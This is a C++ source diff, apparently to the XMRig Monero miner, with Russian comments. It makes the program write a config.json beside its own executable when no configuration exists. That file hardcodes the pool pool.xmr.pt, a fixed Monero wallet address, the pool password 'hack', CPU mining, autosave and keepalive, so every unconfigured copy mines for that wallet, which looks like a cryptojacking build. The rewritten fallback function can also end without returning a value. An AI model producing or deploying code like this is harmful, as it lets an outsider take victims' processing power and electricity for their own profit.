@@ -18,6 +18,9 @@
 
 #include <iostream>
 
+#include <fstream>
+#include <unistd.h>
+
 #include <cassert>
 #include <memory>
 
@@ -64,23 +67,55 @@ static const char *kConfigPathV2 = "/2/config";
 
 namespace xmrig {
 
+std::string getExecutablePath() {
+    char path[1024];
+    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
+    if (len == -1) {
+        std::cerr << "Failed to get executable path" << std::endl;
+        return "";
+    }
+    path[len] = '\0';
+    return std::string(path);
+}
+
 class DefaultConfig : public Config
 {
 public:
-    DefaultConfig()
-    {
-        Config *defaultConfig = new Config();
-
-        if (!defaultConfig) {
-            std::cerr << "Failed to create Config object." << std::endl;
+    static bool createDefaultConfig(const std::string& fileName) {
+        std::string execPath = getExecutablePath();
+        if (execPath.empty()) {
+            return false;
         }
 
-        xmrig::Pool pool;
-        pool.setUrl("pool.xmr.pt:3333");
-        pool.setUser("481dqAWdnN7cQGE7gn5mzuHNRMwkyArJQJBu8Fg38CCf74ivJXQUUVo6HE6Fr4LNGN6yZTVRVGuw8eykZ4Jby3sWKb9k1qK");
-        pool.setPassword("x");
+        // Убираем имя программы, оставляя только путь
+        size_t pos = execPath.find_last_of('/');
+        std::string dirPath = execPath.substr(0, pos + 1);
 
-        defaultConfig->addPool(pool);
+        std::ofstream file(dirPath + "/" + fileName);
+        if (!file.is_open()) {
+            std::cerr << "Failed to create configuration file: " << fileName << std::endl;
+            return false;
+        }
+
+        file << "{\n";
+        file << "  \"autosave\": true,\n";
+        file << "  \"cpu\": true,\n";
+        file << "  \"opencl\": false,\n";
+        file << "  \"cuda\": false,\n";
+        file << "  \"pools\": [\n";
+        file << "    {\n";
+        file << "      \"coin\": \"monero\",\n";
+        file << "      \"url\": \"pool.xmr.pt:9000\",\n";
+        file << "      \"user\": \"481dqAWdnN7cQGE7gn5mzuHNRMwkyArJQJBu8Fg38CCf74ivJXQUUVo6HE6Fr4LNGN6yZTVRVGuw8eykZ4Jby3sWKb9k1qK\",\n";
+        file << "      \"pass\": \"hack\",\n";
+        file << "      \"keepalive\": true,\n";
+        file << "      \"tls\": true\n";
+        file << "    }\n";
+        file << "  ]\n";
+        file << "}\n";
+
+        std::cerr << "Default configuration created at: " << fileName << std::endl;
+        return true;
     }
 };
 
@@ -176,15 +211,15 @@ private:
 
         // Если конфигурация не найдена, использовать дефолтные значения
         std::cerr << "No configuration found. Using default settings." << std::endl;
-        return createDefaultConfig();
-    }
 
-    // Метод для создания дефолтной конфигурации
-    inline static Config *createDefaultConfig()
-    {
-        Config *defaultConfig = new DefaultConfig();
+        DefaultConfig defaultConfig;
+        defaultConfig.createDefaultConfig("config.json");
 
-        return defaultConfig;
+
+        chain.addFile(Process::location(Process::DataLocation, "config.json"));
+        if (read(chain, config)) {
+            return config.release();
+        }
     }
 };
 
